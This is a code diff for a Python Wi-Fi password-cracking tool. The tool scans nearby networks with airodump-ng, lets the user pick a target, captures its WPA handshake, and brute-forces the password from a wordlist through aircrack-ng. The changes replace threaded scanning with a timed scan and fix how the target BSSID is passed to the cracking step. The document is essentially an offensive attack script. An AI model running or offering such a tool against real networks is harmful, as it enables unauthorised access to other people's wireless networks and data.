@@ -2,18 +2,16 @@ import os
 import subprocess
 import time
 import sys
-import threading
 from colorama import Fore, Style, init
 
 # Initialize colorama
 init(autoreset=True)
 
 # Configuration
-WORDLIST = "wordlist.txt"  # Path to the wordlist file
+WORDLIST = "wifyte.txt"  # Path to the wordlist file
 TIMEOUT = 180  # Timeout for capturing handshake (3 minutes)
-
-# Global flag to stop scanning
-stop_scanning = False
+SCAN_DURATION = 12  # Total scanning duration in seconds
+SCAN_INTERVAL = 3  # Interval between scans in seconds
 
 
 def detect_wifi_adapter():
@@ -46,115 +44,99 @@ def enable_monitor_mode(interface):
 
 
 def scan_networks(interface):
-    global stop_scanning
     networks = []
+    print(
+        Fore.CYAN
+        + "[+] Scanning for available Wi-Fi networks... This will take 12 seconds."
+    )
 
-    def run_scan():
-        nonlocal networks
-        while not stop_scanning:
-            try:
-                # Run airodump-ng to scan networks
-                process = subprocess.Popen(
-                    ["airodump-ng", interface],
-                    stdout=subprocess.PIPE,
-                    stderr=subprocess.PIPE,
-                    text=True,
-                )
-
-                # Allow time for scanning
-                time.sleep(3)
-                process.terminate()
-
-                # Parse the output of airodump-ng
-                output = process.stdout.read()
-                lines = output.split("\n")
-                temp_networks = []
-                bssid_index = None
-                ssid_index = None
-                channel_index = None
-                signal_index = None
-                clients_index = None
-
-                for line in lines:
-                    if "BSSID" in line:
-                        # Find column indices
-                        headers = line.split()
-                        bssid_index = headers.index("BSSID")
-                        ssid_index = headers.index("ESSID")
-                        channel_index = headers.index("CH")
-                        signal_index = headers.index("PWR")
-                        clients_index = (
-                            headers.index("STATION") if "STATION" in headers else None
-                        )
-                        continue
-
-                    if len(line.strip()) > 0 and "Station" not in line:
-                        parts = line.split()
-                        if (
-                            len(parts)
-                            < max(bssid_index, ssid_index, channel_index, signal_index)
-                            + 1
-                        ):
-                            continue
-                        bssid = parts[bssid_index]
-                        channel = parts[channel_index]
-                        ssid = (
-                            parts[ssid_index] if len(parts) > ssid_index else "<Hidden>"
-                        )
-                        signal = int(parts[signal_index])  # Signal strength in dBm
-                        clients = (
-                            parts[clients_index]
-                            if clients_index and len(parts) > clients_index
-                            else "0"
-                        )
-                        temp_networks.append(
-                            {
-                                "BSSID": bssid,
-                                "Channel": channel,
-                                "SSID": ssid,
-                                "Signal": signal,
-                                "Clients": clients,
-                            }
-                        )
-                networks.clear()
-                networks.extend(temp_networks)
-
-            except Exception as e:
-                print(Fore.RED + f"[-] Failed to scan networks: {e}")
-
-    # Start scanning in a separate thread
-    scan_thread = threading.Thread(target=run_scan)
-    scan_thread.daemon = True
-    scan_thread.start()
-
-    try:
-        while not stop_scanning:
-            # Clear the screen and display the updated list
-            os.system("clear" if os.name != "nt" else "cls")
-            print(
-                Fore.CYAN
-                + "[+] Scanning for available Wi-Fi networks... Press Ctrl+C to stop scanning."
+    # Perform scanning in intervals
+    start_time = time.time()
+    while time.time() - start_time < SCAN_DURATION:
+        try:
+            # Run airodump-ng to scan networks
+            process = subprocess.Popen(
+                ["airodump-ng", interface],
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE,
+                text=True,
             )
-            print(Fore.CYAN + "[+] Available Wi-Fi networks:")
-            if not networks:
-                print(Fore.YELLOW + "[-] No networks detected yet. Please wait...")
-            else:
-                for i, network in enumerate(networks):
-                    signal_strength = abs(network["Signal"])
-                    if signal_strength <= 50:
-                        color = Fore.GREEN  # Strong signal
-                    elif 50 < signal_strength <= 70:
-                        color = Fore.YELLOW  # Moderate signal
-                    else:
-                        color = Fore.RED  # Weak signal
-                    print(
-                        f"{i + 1}. {color}SSID: {network['SSID']}, BSSID: {network['BSSID']}, Channel: {network['Channel']}, Signal: {network['Signal']} dBm, Clients: {network['Clients']}"
+
+            # Allow time for scanning
+            time.sleep(SCAN_INTERVAL)
+            process.terminate()
+
+            # Parse the output of airodump-ng
+            output = process.stdout.read()
+            lines = output.split("\n")
+            temp_networks = []
+            bssid_index = None
+            ssid_index = None
+            channel_index = None
+            signal_index = None
+            clients_index = None
+
+            for line in lines:
+                if "BSSID" in line:
+                    # Find column indices
+                    headers = line.split()
+                    bssid_index = headers.index("BSSID")
+                    ssid_index = headers.index("ESSID")
+                    channel_index = headers.index("CH")
+                    signal_index = headers.index("PWR")
+                    clients_index = (
+                        headers.index("STATION") if "STATION" in headers else None
                     )
-            time.sleep(3)  # Refresh every 3 seconds
-    except KeyboardInterrupt:
-        print(Fore.YELLOW + "\n[+] Stopping Wi-Fi scan...")
-        stop_scanning = True
-        scan_thread.join()
+                    continue
+
+                if len(line.strip()) > 0 and "Station" not in line:
+                    parts = line.split()
+                    if (
+                        len(parts)
+                        < max(bssid_index, ssid_index, channel_index, signal_index) + 1
+                    ):
+                        continue
+                    bssid = parts[bssid_index]
+                    channel = parts[channel_index]
+                    ssid = parts[ssid_index] if len(parts) > ssid_index else "<Hidden>"
+                    signal = int(parts[signal_index])  # Signal strength in dBm
+                    clients = (
+                        parts[clients_index]
+                        if clients_index and len(parts) > clients_index
+                        else "0"
+                    )
+                    temp_networks.append(
+                        {
+                            "BSSID": bssid,
+                            "Channel": channel,
+                            "SSID": ssid,
+                            "Signal": signal,
+                            "Clients": clients,
+                        }
+                    )
+            networks.clear()
+            networks.extend(temp_networks)
+
+        except Exception as e:
+            print(Fore.RED + f"[-] Failed to scan networks: {e}")
+
+    # Display the final list of networks
+    print(Fore.CYAN + "[+] Available Wi-Fi networks:")
+    if not networks:
+        print(Fore.YELLOW + "[-] No networks detected. Please try again.")
+        sys.exit(1)
+
+    for i, network in enumerate(networks):
+        signal_strength = abs(network["Signal"])
+        if signal_strength <= 50:
+            color = Fore.GREEN  # Strong signal
+        elif 50 < signal_strength <= 70:
+            color = Fore.YELLOW  # Moderate signal
+        else:
+            color = Fore.RED  # Weak signal
+        print(
+            f"{i + 1}. {color}SSID: {network['SSID']}, BSSID: {network['BSSID']}, Channel: {network['Channel']}, Signal: {network['Signal']} dBm, Clients: {network['Clients']}"
+        )
 
     return networks
 
@@ -205,7 +187,7 @@ def capture_handshake(interface, bssid, channel):
     return None
 
 
-def crack_handshake(cap_file, wordlist):
+def crack_handshake(cap_file, wordlist, target_bssid):
     print(Fore.CYAN + f"[+] Starting cracking process using wordlist: {wordlist}...")
     try:
         with open(wordlist, "r", encoding="latin-1") as f:
@@ -222,7 +204,7 @@ def crack_handshake(cap_file, wordlist):
                     "-w",
                     "-",  # Read password from stdin
                     "-b",
-                    TARGET_BSSID,
+                    target_bssid,  # Use the selected BSSID
                     cap_file,
                 ],
                 input=password.encode(),
@@ -250,7 +232,6 @@ def disable_monitor_mode(interface):
 
 
 def main():
-    global stop_scanning
     # Step 1: Detect Wi-Fi adapter
     adapter = detect_wifi_adapter()
 
@@ -275,21 +256,20 @@ def main():
             sys.exit(1)
 
         target = networks[choice]
+        TARGET_BSSID = target["BSSID"]  # Define TARGET_BSSID here
         print(
             Fore.CYAN
-            + f"[+] Target selected: SSID: {target['SSID']}, BSSID: {target['BSSID']}, Channel: {target['Channel']}"
+            + f"[+] Target selected: SSID: {target['SSID']}, BSSID: {TARGET_BSSID}, Channel: {target['Channel']}"
         )
 
         # Step 5: Capture handshake
-        cap_file = capture_handshake(
-            monitor_interface, target["BSSID"], target["Channel"]
-        )
+        cap_file = capture_handshake(monitor_interface, TARGET_BSSID, target["Channel"])
         if not cap_file:
             print(Fore.RED + "[-] Test failed. No handshake captured.")
             sys.exit(1)
 
         # Step 6: Crack handshake
-        success = crack_handshake(cap_file, WORDLIST)
+        success = crack_handshake(cap_file, WORDLIST, TARGET_BSSID)
         if not success:
             print(Fore.RED + "[-] Cracking failed. Password not found.")
 
